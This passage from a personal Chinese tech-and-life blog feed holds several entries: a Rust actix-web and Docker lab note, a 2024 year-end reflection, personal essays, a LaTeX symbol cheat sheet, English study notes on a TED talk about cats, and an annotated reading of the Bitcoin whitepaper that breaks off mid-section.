punctuation">::</span><span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"Hey"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[actix_web::main]</span><span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpServer</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> cors <span class="token operator">=</span> <span class="token class-name">Cors</span><span class="token punctuation">::</span><span class="token function">permissive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">App</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">wrap</span><span class="token punctuation">(</span>cors<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>hello<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>echo<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">"/hey"</span><span class="token punctuation">,</span> <span class="token namespace">web<span class="token punctuation">::</span></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">to</span><span class="token punctuation">(</span>manual_hello<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment">//.bind(("192.168.199.248", 8888))?</span>    <span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span>    <span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">await</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lab1-4"><a href="#lab1-4" class="headerlink" title="lab1-4"></a>lab1-4</h3><p>用<code>Docker</code>部署一个<code>SwaggerEditor</code></p><pre class="line-numbers language-none"><code class="language-none">docker pull swaggerapi&#x2F;swagger-editordocker run -d -p 8080:8080 swaggerapi&#x2F;swagger-editor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编辑<code>Api</code>文档，并将主机设置为服务器的ip地址，其模拟的是用Api接口对正在运行的web程序进行调用，测试结果如下</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202501192104464.png" alt="image-20250119201512645"></p><blockquote><p>ps:犯蠢在<code>SweaggerEditor</code>的里面的ip地址填了实验室机子在局域网下的ip地址，导致一直连不上，虽然现在也是对一堆ip地址和相互之间的调用晕头转向，计网些许复杂</p></blockquote><h2 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h2><h3 id="Lab2-1"><a href="#Lab2-1" class="headerlink" title="Lab2-1"></a>Lab2-1</h3><p>封装Rust程序进入Docker镜像</p><p>按照给定的Hints构建Docker镜像，然后ip地址使用内网ip，运行后访问得如下</p><pre class="line-numbers language-none"><code class="language-none">docker buildx build -t actix-example:v0.1 .docker run -p 8888:8888 actix-example:v0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202501192104489.png" alt="image-20250119205031802"></p><p>同时程序的监控ip地址记得要改成内网ip。</p><h3 id="Lab2-2"><a href="#Lab2-2" class="headerlink" title="Lab2-2"></a>Lab2-2</h3><p><code>-d</code>参数是转为后台运行.</p><blockquote><p>知识补充：</p><p>为了避免每次run都重新让镜像生成容器，可以在生成第一个容器后用start和stop命令来控制容器的开启和停止，用ps命令来观察容器的状态和数量，而且每次start是默认在后台start，就不用添加-d参数。（这个是docker的老本了）</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>认为这个Week1的lab很轻松，给了大量的提示和教导，可以说是宝宝级别的开拓眼见指导。感谢DLC。</p><p>这几天学了很多<code>Rust</code>相关知识，但是学到现在感觉自己要回头重新补课了，学到生命周期和迭代器已经彻底的昏头转向。</p>]]></content>
      
      
      <categories>
          
          <category> DragonOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Rust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年终总结</title>
      <link href="/2025/01/04/2024/"/>
      <url>/2025/01/04/2024/</url>
      
        <content type="html"><![CDATA[<h1 id="试错"><a href="#试错" class="headerlink" title="试错"></a>试错</h1><p><strong>过去的一年是试错的一年，在尝试往外看，但频繁犯错，大错小错连串。</strong></p><p>好像犯错才是人生的常态。但不想这样，但试错才能摸清前进的道路。这一年的关键词就是试错。</p><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>摇摇晃晃又是一年过去，每年初总会回顾这一年，回顾去年初的自己，好像年复一年的回顾，相同的叹息懊恼间歇性奋发图强已成为常态，发现自己总是活在自己的舒适圈中，无所谓外界的改变，纵使心中志向满满当当，充满了无限的憧憬和规划但好似总是停留在纸上，后悔慢慢成为了我的主旋律。一个囚笼。</p><p>年复一年，好似都会纳闷，好像这一年没有任何的改变，但肯定是有的，但感觉没有做什么值得让自己骄傲，在梦中都能笑醒的事情，大概是本我发现其实这一年都没有认真的<em>all in</em>一件事情吧，无论是学习还是<em>csapp</em>，还是<em>合约开发</em>，还是<em>acm</em>，都是在被时间消磨些许精力，怎么会打不破这般牢笼呢？或许人生本就该活在当下，认真的享受当下，我也同意，不该对过去有过多的抱怨，不该对未来有太过的期许，但这是我过去每一天的当下呀！在时间的积分下，我没有好好的对待我的生活，过去每一天我没有尽力的享受我的生活，束缚，跳脱！</p><h2 id="大事盘点"><a href="#大事盘点" class="headerlink" title="大事盘点"></a>大事盘点</h2><p>可能我在总结中总是对自己要求过高，自己做到的太少，所以总是充满了悲观和落寞。但这一年还是发生了不少有意思的，值得纪念的事情。</p><p>先说说一个小小的失败，在11月底的时候扛着七八百块进入合约市场，在开始的小挫折之后，做了四天的十倍合约将资产干到6700块钱，然后凭借着糟糕的仓位管理和对胜利的渴望将所有的钱都输了回去，一次极好的教训，只用800块钱就告诉我要怎样做人，让我懂得沉淀，还是多多了解市场，交了这笔学费还是吸取到了宝贵的经验，不错。再其次便是<code>ACM</code>拿了个省赛的银奖和区域赛的铜奖，虽然出力不多但至少蹭到了个奖。也仓促的完成了<code>csapp</code>的学习，产出了$8+1+1$篇博文，勉强算得上一些知识产出。</p><p>零星的看了些书，但都没看完，最近在看《当下的力量》，认为自己找到了本我，在尝试不被思维控制，对自己有了更深的体悟，更沉稳了，认为自己看书要写读书报告，《悉达多》，《吸引力法则》都要去看看!</p><p>在人际关系方面也收获了自己的爱情，并且坚信能走到最后，虽然在友情关系上因为选择不同失去了几个要好的朋友，和他们形同陌路。巨大的伤心之后也有了成长，接受一段又一段的友谊，增强自身的能量才是我要做的。不要被内耗，强大自己，去接受新的关系，培养新的技能，找到新的兴趣，自然会有新的朋友。</p><p>多尝试了新鲜东西，<code>java</code>，<code>python</code>,<code>javascript</code>,<code>ethers</code>,<code>uniswap</code>…，见识到了<code>web3</code>的广阔天地和惨烈市场，也见识到了代码里的奇思妙想，复杂框架，遗憾于没有学习<code>cs6.018</code>,几乎没学<code>cs61B</code>,<code>cmu15-445</code>，不够沉稳，缺少定力。我认为我会有所改变。</p><blockquote><p>活像个孤独患者，自我拉扯</p></blockquote><p>生活要继续，既然过去以不满意，那就认真对待好当下的每一天，伤春悲秋是文人墨客的事，我等凡夫俗子过不满意的每一天都是对自我的践踏。</p><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><p>2025伊始，要有对自己的要求，认为这一年的我会有所改变的</p><h2 id="专业"><a href="#专业" class="headerlink" title="专业"></a>专业</h2><p><strong>项目开发+国外高质量课程学习</strong></p><h3 id="项目开发"><a href="#项目开发" class="headerlink" title="项目开发"></a>项目开发</h3><p>恍然间发现，原来在github上多做贡献是会有评级的，今年的目标就浅浅在年底前达到<code>B+</code>吧，增加活跃度，即多提交代码，多做贡献，多提<code>issue</code>，一年的时间，去做不同的开源项目来谋取实习机会，刻不容缓，目前准备参与的是<code>DragonOS</code>大项目学习。</p><h3 id="国外高质量课程学习"><a href="#国外高质量课程学习" class="headerlink" title="国外高质量课程学习"></a>国外高质量课程学习</h3><p>在上次学习<code>csapp</code>后，感觉因为自己的效率低下和怠慢导致学习效果较差，还是得认真搞搞，国外的课程确实硬邦邦，目前正在参与的是<code>cmu15-213</code>,可能会参与<code>cs6.018</code>,认为自己学习太过怠慢，打apex的时间分出$\frac{1}{10}$都能学两遍<code>csapp</code>了，显得部分荒谬。更有些荒谬的是，没想到自己在<code>bilibili</code>上几乎全勤，终于知道自己的时间都去哪了，小乐。</p><h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p><strong>多读书，多弹吉他，多跑步，多骑车！</strong></p><p>四项事已经可以充满我的生活了，去年四项的热度都在短暂拉高然后阴跌，该有一个良好的生活习惯。<del>虽然这篇文章就是在凌晨2:33分写的</del></p><p>用书本看清自己，用音乐丰富生活，用跑步强壮自身，用骑车观察世界。</p><p>我有资格也有能力过好自己的生活，与诸君共勉。</p><h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><p>规划年年有，今年特别多，年过20，已经迈向三字头了，刚刚玩了一个小时帕鲁，愿每天都能去做前一天的规划，和大家共勉。</p><blockquote><p>心知无难事，搁置成难事。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
            <tag> 规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>选择与后悔</title>
      <link href="/2024/12/30/bad/"/>
      <url>/2024/12/30/bad/</url>
      
        <content type="html"><![CDATA[<p>一个人只有在从没有处理过，从未见过的事件中才能得以蜕变。</p><hr><p>最近发生了好多事，从未预料过的事，自古皆言道多情剑客无情剑，何为情，何为爱，何为君子之交。</p><p>当道德感败坏却又从中获益，却承担着损失的巨大风险，如何选择？</p><ul><li>做一个圣母，谁更伤心，谁更处于困境之中便向其施以援助之手，这看似是一个无私，其实这反倒是最大的自私，自私的想把身上的责任全部缕清，不断的询问他人的意见是为了博取他人的同情，获得在他人心中的高道德感—我是为了大公，为了所有人，为了全人类，这可太太可笑，当自己把自己欺骗之时更可笑，有时生活不就是如此,你总要在两件事物中做出选择，并且要承担你都无法承担的后果，你可以不做决断，那有可能会让伤害更大，造成更加无法挽回的后果。</li><li>做一个决断者，在事情的萌芽之初便采取行动相较于发展而犹豫不决更加坚定，但在事情发展的任意时间进行快速决断都是正确的，很多时一件事其实不论对错，你可以以自身利益为论，以他人感受为论（但我现在很抵触圣母行径），也可以不论，摆烂式回应，但是总得有一个确定的选择，不后悔的选择，可以参考他人的意见，但不能做一个盲从者，做一个扶不起的阿斗，人最重要的就是独立思考，坚定的做一个决断者，直面过去，造成的伤害已然发生，伤春悲秋只是太懦弱。</li></ul><p>君子之交太稳妥太稳健，稳定的伴侣太幸福，太有未来，纵使负面言论再多，过去的事再怎么向我佐证她没这么大的可能陪我走完我想走的路，（也可能被迫走上不想走的），我也不愿压上我的君子之交，但事情已然发生，再回头只会造成更多的伤害，互不交谈就是最好的问候。我珍惜我眼前的这个女生，享受和她一起的所有时间，我认真的认为我们能有更好的生活，比现在更好，比想象更好。我会学会过好两个人的生活，未来有了更充裕的企盼，当然我更应该学会的是独立的思考，和拥有直面痛苦的权力，活得清醒，获得无束！</p><p>言毕，新年伊始，人会更好。</p><blockquote><p>一朝烟雨一场梦，醒时泪洒烟雨江。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
            <tag> 镜花水月 </tag>
            
            <tag> 交往 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Latex语法备忘录</title>
      <link href="/2024/12/29/latex_use/"/>
      <url>/2024/12/29/latex_use/</url>
      
        <content type="html"><![CDATA[<h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">αA <span class="token function selector">\alpha</span> Aβ B <span class="token function selector">\beta</span> Bγ Γ <span class="token function selector">\gamma</span> <span class="token function selector">\Gamma</span>δ Δ <span class="token function selector">\delta</span> <span class="token function selector">\Delta</span>ϵ ε E <span class="token function selector">\epsilon</span> <span class="token function selector">\varepsilon</span> Eζ Z <span class="token function selector">\zeta</span> ZηH <span class="token function selector">\eta</span> Hθ ϑ Θ <span class="token function selector">\theta</span> <span class="token function selector">\vartheta</span> <span class="token function selector">\Theta</span>ι I <span class="token function selector">\iota</span> Iκ K <span class="token function selector">\kappa</span> Kλ Λ <span class="token function selector">\lambda</span> <span class="token function selector">\Lambda</span>μ M <span class="token function selector">\mu</span> Mν V <span class="token function selector">\nu</span> Vξ Ξ <span class="token function selector">\xi</span> <span class="token function selector">\Xi</span>ο O o Oπ Π <span class="token function selector">\pi</span> <span class="token function selector">\Pi</span>ρ ϱ P <span class="token function selector">\rho</span> <span class="token function selector">\varrho</span> Pσ Σ <span class="token function selector">\sigma</span> <span class="token function selector">\Sigma</span>τ T <span class="token function selector">\tau</span> Tυ Υ <span class="token function selector">\upsilon</span> <span class="token function selector">\Upsilon</span>ϕ φ Φ <span class="token function selector">\phi</span> <span class="token function selector">\varphi</span> <span class="token function selector">\Phi</span>χ X <span class="token function selector">\chi</span> Xψ Ψ <span class="token function selector">\psi</span> <span class="token function selector">\Psi</span>ω Ω <span class="token function selector">\omega</span> <span class="token function selector">\Omega</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="求和符号"><a href="#求和符号" class="headerlink" title="求和符号"></a>求和符号</h3><p>在 LaTeX 中，你可以使用 <code>\sum</code> 命令插入求和符号。例如，要创建 $\sum_{i&#x3D;1}^{n} i$（从 1 求和到 n），你可以这样编写：</p><pre class="line-numbers language-none"><code class="language-none">latex $\sum_&#123;i&#x3D;1&#125;^&#123;n&#125; i$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="积分符号"><a href="#积分符号" class="headerlink" title="积分符号"></a>积分符号</h3><p>LaTeX 提供了多种类型的积分符号，如不定积分、定积分、重积分等。以下是一些常见的积分符号示例：</p><ul><li>不定积分：使用 <code>\int</code> 命令，例如 $\int f(x) , dx$。</li><li>定积分：使用 <code>\int_&#123;a&#125;^&#123;b&#125;</code> 命令，例如 $\int_{a}^{b} f(x) , dx$。</li><li>重积分：使用 <code>\iint</code> 或 <code>\iiint</code> 命令，例如 $\iint_{D} f(x, y) , dA$。</li></ul><h3 id="极限符号"><a href="#极限符号" class="headerlink" title="极限符号"></a>极限符号</h3><p>要插入极限符号，可以使用 <code>\lim</code> 命令。例如，要创建 $\lim_{x \to \infty} f(x)$，你可以这样编写：</p><pre class="line-numbers language-none"><code class="language-none">latex $\lim_&#123;x \to \infty&#125; f(x)$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字母上方右箭头<br>$\mathop{A}\limits ^{\rightarrow}$</p><pre class="line-numbers language-none"><code class="language-none">\vec&#123;A&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>$\vec{A}$</p><p>字母上方左箭头</p><pre class="line-numbers language-none"><code class="language-none">$\mathop&#123;A&#125;\limits ^&#123;\leftarrow&#125;$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>$\mathop{A}\limits ^{\leftarrow}$</p>]]></content>
      
      
      <categories>
          
          <category> EATPOOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>事事压身_无所事事</title>
      <link href="/2024/10/02/want_do_dont_do/"/>
      <url>/2024/10/02/want_do_dont_do/</url>
      
        <content type="html"><![CDATA[<h1 id="近况"><a href="#近况" class="headerlink" title="近况"></a>近况</h1><p>放弃了绩点，放弃了课内，发现了区块链，一个全新的有趣的，前景不可预的领域，ACM学习困难进行时，知道自己的字符串要学习但是没有动力学，也有很多题没有做。区块链学的很迷茫，找不到他的前景，（智能合约，Ether.js，Foundry）觉得他没有或者找不到值得学习研究的确切领域。</p><p><strong>知道自己事事压身但又是整天无所事事。</strong></p><p>国庆时节，要在学校坐四天牢，破旧的机房，破旧的椅子，嘈杂的键盘声，但是要坐满五个小时，感觉在那里时间过得特别的慢，效率特别的低。国庆是矛盾的，矛盾在于想要学习却不想学，想在之后的时间出去玩，去香港玩又不是很想花钱，想攒钱买韶音S803骨传导耳机。在迷茫间刷视频，刷着刷着就会思考自己该干什么，真就是完完全全的矛盾心理，在矛盾一次又一次的内耗。过去的已经过去，一味地回味遗憾只会增加内耗，向前看。</p><h1 id="归因"><a href="#归因" class="headerlink" title="归因"></a>归因</h1><p>有一句话很有道理：当你身边有很多事情等着做的时候你就不会内耗，这有一个前提就是有做事情的动力，而不是迟迟未开始！</p><p>为什么会有很多事情要做，归根结底是我想进步想研究了解更多的领域，也有对未来的模糊计划，</p><p>为什么总是不做事，因为：忍受不了孤独寂寞，享受不了独处的学习，内心烦躁，相较于短视频没有及时的享乐，与出游的别人一直在对比，加深了内心的焦虑和迷茫，越不开始越迷茫，心越不静，越难投入，越难开始！</p><h1 id="补救"><a href="#补救" class="headerlink" title="补救"></a>补救</h1><p>连篇道理不如当下的行动，手机是分散我注意力的首要因素，其次是环境，</p><ul><li>手机专注模式</li><li>三秒原则–想到到着手做给自己三秒的准备</li><li>理性的思考</li></ul><p>提高精简执行力！</p>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 镜花水月 </tag>
            
            <tag> 矛盾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cats act weird</title>
      <link href="/2024/08/19/TED_5/"/>
      <url>/2024/08/19/TED_5/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.ted.com/talks/tony_buffington_why_do_cats_act_so_weird/">MP3</a></p></blockquote><h1 id="Why-do-cats-act-so-weird"><a href="#Why-do-cats-act-so-weird" class="headerlink" title="Why do cats act so weird?"></a>Why do cats act so weird?</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Cat: cute ,popular,entertaining</p><p>super cat</p><p>high adventure </p><p>eat many time each day</p><p>exactly what he ans that,via the life</p><p>possible the her heart </p><p>fix the cast,what are we</p><h2 id="Article"><a href="#Article" class="headerlink" title="Article"></a>Article</h2><p>Why do cats do that? They’re cute, they’re lovable, and judging by the 26 billions views of over 2 million YouTube videos of them pouncing, <strong>bouncing,climbing, cramming, stalking, clawing, chattering, and purring,</strong> one thing is certain: cats are very entertaining. These somewhat strange <strong>feline</strong>(relating to the cats) behaviors, both amusing and <strong>baffling</strong>(someone baffle you that you can’t understand or explain it) , leave many of us asking, “Why do cats do that?”</p><p>Throughout time, cats were simultaneously <strong>solitary</strong>(only one) <strong>predators</strong>(A animal that kill and eat other animals) of smaller animals and <strong>prey</strong>(eaten animals) for larger carnivores. As both predator and prey, survival of their species depended on crucial <strong>instinctual</strong>(A way to know something ) behaviors which we still observe in wild and do  mestic cats today. While the feline actions of your house cat Grizmo might seem perplexing, in the wild, these same behaviors, naturally bred into cats for millions of years, would make Grizmo a super cat.</p><p>Enabled by their unique muscular structure and keen balancing abilities, cats climbed to high vantage points to survey their territory and spot prey in the wild. Grizmo doesn’t need these particular skills to find and hunt down dinner in her food bowl today, but instinctually, viewing the living room from the top of the bookcase is exactly what she has evolved to do.</p><p>As wild predators, cats are opportunistic and hunt whenever prey is available. Since most cat prey are small, cats in the wild needed to eat many times each day, and use a stalk, pounce, kill, eat strategy to stay fed. This is why Grizmo prefers to chase and pounce on little toys and eat small meals over the course of the day and night. Also, small prey tend to hide in tiny spaces in their natural environments, so one explanation for Grizmo’s propensity to reach into containers and openings is that she is compelled by the same curiosity that helped ensure the continuation of her species for millions of years before.</p><p>In the wild, cats needed sharp claws for climbing, hunting, and self-defense. Sharpening their claws on nearby surfaces kept them conditioned and ready, helped stretch their back and leg muscles, and relieve some stress, too. So, it’s not that Grizmo hates your couch, chair, ottoman, pillows, curtains, and everything else you put in her environment. She’s ripping these things to shreds and keeping her claws in tip-top shape because this is exactly what her ancestors did in order to survive.</p><p>As animals that were preyed upon, cats evolved to not get caught, and in the wild, the cats that were the best at avoiding predators thrived. So at your house today, Grizmo is an expert at squeezing into small spaces and seeking out and hiding in unconventional spots. It also explains why she prefers a clean and odor-free litter box. That’s less likely to give away her location to any predators that may be sniffing around nearby.</p><p>Considering everything we do know about cats, it seems that one of their most predominate behaviors is still one of the most mysterious. Cats may purr for any number of reasons, such as happiness, stress, and hunger. But curiously, the frequency of their purrs, between 25 and 150 hertz, is within a range that can promote tissue regeneration. So while her purring makes Grizmo an excellent nap companion, it is also possible that her purr is healing her muscles and bones, and maybe even yours, too.</p><p>They developed through time as both solitary predators that hunted and killed to eat, and stealthy prey that hid and escaped to survive. So cats today retain many of the same instincts that allowed them to thrive in the wild for millions of years. This explains some of their seemingly strange behaviors. To them, our homes are their jungles. But if this is the case, in our own cat’s eyes, who are we? Big, dumb, hairless cats competing with them for resources? Terribly stupid predators they’re able to outsmart every day? Or maybe they think we’re the prey.</p>]]></content>
      
      
      <categories>
          
          <category> TED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> TED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>比特币白皮书注解</title>
      <link href="/2024/07/11/whitepaper/"/>
      <url>/2024/07/11/whitepaper/</url>
      
        <content type="html"><![CDATA[<h1 id="白皮书注解"><a href="#白皮书注解" class="headerlink" title="白皮书注解"></a>白皮书注解</h1><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p>中本聪的比特币白皮书下载</p><p><a href="https://bitcoin.org/bitcoin.pdf">英文原版</a></p><p><a href="https://bitcoin.org/files/bitcoin-paper/bitcoin_zh_cn.pdf">中文翻译版</a></p></blockquote><h2 id="2-Transcation"><a href="#2-Transcation" class="headerlink" title="2.Transcation"></a>2.Transcation</h2><blockquote><p>Each owner transfers the coin to the next by digitally signing a hash of the previous transaction and the public key of the next owner and adding these to the end of the coin. A payee can verify the signatures to verify the chain of ownership.</p></blockquote><p>交易链条为：</p><p>o–&gt;1–&gt;2–&gt;3</p><p>每个主体都有public key 和 private key，其中private key –》signature。</p><p>即付款人会根据前一次交易的哈希值和收款人的public key进行 signature，(使用自己的私钥对当前交易的哈希值和接收者的公钥进行数字签名。数字签名是一种使用私钥加密特定信息（如哈希值）的方式，只有签名者的公钥才能验证签名的真实性。)收款人会使用发送者的公钥验证数字签名的真实性。如果签名有效，这证明了签名确实是由发送者（即之前的所有者）生成的，且签名中的数据（即哈希值和接收者的公钥）在签名后未被篡改。</p><p>所以对于这幅图，我们应该这样子看：</p><p>只看中间的，将coin from 1 to 2 的过程，the 1’s signature can be verified by 1’s public key ,and the 1’s private key generate the 1’s signature with the previous transaction and the public key of the next owner(2).</p><p><del>在图一看了两天才终于看懂，服了</del></p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202407112309728.png" alt="image-20240711205946226"></p><blockquote><p>we need a system for participants to agree on a single history of the order in which they were received. The payee needs proof that at the time of each transaction, the majority of nodes agreed it was the first received.</p></blockquote><p>共识！</p><h2 id="3-Timestamp-Sever"><a href="#3-Timestamp-Sever" class="headerlink" title="3.Timestamp Sever"></a>3.Timestamp Sever</h2><h2 id="4-Proof-of-Work"><a href="#4-Proof-of-Work" class="headerlink" title="4.Proof-of-Work"></a>4.Proof-of-Work</h2><p>为了实现分布式时间戳服务器，所以要招募矿工来往上上传Block</p><blockquote><p>The average work required is exponential in the number of zero bits required and can be verified by executing a single hash.</p></blockquote><p>即通过计算求得所满足条件的Hash值，而CPU性能越好的人猜出来的概率越大，这就是proof of work</p><blockquote><p>Once the CPU effort has been expended to make it satisfy the proof-of-work, the block cannot be changed without redoing the work. As later blocks are chained after it, the work to change the block would include redoing all the blocks after it.</p></blockquote><p>满足了条件后不能修改这个块，所以不会出现这样一种情况：提前确定好块上传的权力，然后再往里面填写交易信息，这样子会产生double spending。</p><blockquote><p>To modify a past block, an attacker would have to redo the proof-of-work of the block and all blocks after it and then catch up with and surpass the work of the honest nodes.</p></blockquote><p>Attacker想要改变其中的块不能直接更改，需要上传更改块和更改后的所有块，并且超过honest nodes ‘s chain，后续会通过泊松分布来证明当attacker的算力小于51%时，极难篡改交易信息。</p><h2 id="5-Network"><a href="#5-Network" class="headerlink" title="5.Network"></a>5.Network</h2><blockquote><ol><li><p>New transactions are broadcast to all nodes.</p></li><li><p>Each node collects new transactions into a block.</p></li><li><p>Each node works on finding a difficult proof-of-work for its block.</p></li><li><p>When a node finds a proof-of-work, it broadcasts the block to all nodes.</p></li><li><p>Nodes accept the block only if all transactions in it are valid and not already spent.</p></li><li><p>Nodes express their acceptance of the block by working on creating the next block in the chain, using the hash of the accepted block as the previous hash.</p></li></ol></blockquote><p>简洁高效的描绘一整个流程，广播交易，收集交易，打包成块，找到proog-of-work,满足成链条件，广播块，接受块，循环往复</p><blockquote><p>Nodes always consider the longest chain to be the correct one and will keep working on extending it.</p></blockquote><p>即使存在两个node同时find 的情况，也仅仅这是会有一个毛刺，nodes随机确定chain，在下一次find后都将移到the longest chain 上工作！</p><blockquote><p>Block broadcasts are also tolerant of dropped messages. If a node does not receive a block, it will request it when it receives the next block and realizes it missed one.</p></blockquote><p>容错！</p><h2 id="6-Incentive"><a href="#6-Incentive" class="headerlink" title="6.Incentive"></a>6.Incentive</h2><blockquote><p>By convention, the first transaction in a block is a special transaction that starts a new coin owned by the creator of the block. This adds an incentive for nodes to support the network, and provides a way to initially distribute coins into circulation, since there is no central authority to issue them. The steady addition of a constant of amount of new coins is analogous to gold miners expending resources to add gold to circulation. In our case, it is CPU time and electricity that is expended.</p></blockquote><p>矿工名字的由来，消耗CPU的时间和算力来换取resources to circulation</p><p>Transaction fees</p><blockquote><p>Once a predetermined number of coins have entered circulation, the incentive can transition entirely to transaction fees and be completely inflation free.</p></blockquote><p>在一定数量的coins进入市场后，可以取消incentive，将其全部转化为incentive，相当于大家想要让nodes帮他上传交易，就需要交一点服务费。</p><blockquote><p>He ought to find it more profitable to play by the rules, such rules that favour him with more new coins than everyone else combined, than to undermine the system and the validity of his own wealth.</p></blockquote><p>同时the incentive 能让那些greedy放弃犯罪扰乱秩序，因为他使用超过honest nodes的算力拿来挖矿会更划算，增长自身财富同时维持市场稳定性。</p><p>不怕你算力大，就怕你硬钢市场，一损俱损！</p><h2 id="7-Reclaiming-Disk-Space"><a href="#7-Reclaiming-Disk-Space" class="headerlink" title="7.Reclaiming Disk Space"></a>7.Reclaiming Disk Space</h2><blockquote><p>Once the latest transaction in a coin is buried under enough blocks, the spent transactions before it can be discarded to save disk space. To facilitate this without breaking the block’s hash, transactions are hashed in a Merkle Tree , with only the root included in the block’s hash. Old blocks can then be compacted by stubbing off branches of the tree. The interior hashes do not need to be stored.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202407112309736.png" alt="image-20240711222700867"></p><p>只保留头部区块，极大地压缩空间</p><p><strong>但是我还不知道为什么一个block里面有这么多hash，是每一个交易都会根据前一个交易然后生成一个新的hash，然后一步一步套着最后只有一个hash，但是这种情况下如何溯源coin的交易呢，即谁谁谁到底有多少coins？</strong></p><h2 id="8-Simplified-Payment-Verification"><a href="#8-Simplified-Payment-Verification" class="headerlink" title="8.Simplified Payment Verification"></a>8.Simplified Payment Verification</h2><blockquote><p>obtain the Merkle branch linking the transaction to the block it’s timestamped in. He can’t check the transaction for himself, but by linking it to a place in the chain, he can see that a network node has accepted it, and blocks added after it further confirm the network has accepted it.</p></blockquote><p>通过不完整的节点也能确认支付，只要他在最长chain的block的merkle的分支下(与时间戳对应）即可。</p><blockquote><p>One strategy to protect against this would be to accept alerts from network nodes when they detect an invalid block, prompting the user’s software to download the full block and alerted transactions to confirm the inconsistency. </p></blockquote><p>减少attackers控制大多数算力情况的损失</p><h2 id="9-Combining-and-Splitting-Value"><a href="#9-Combining-and-Splitting-Value" class="headerlink" title="9.Combining and Splitting Value"></a>9.Combining and Splitting 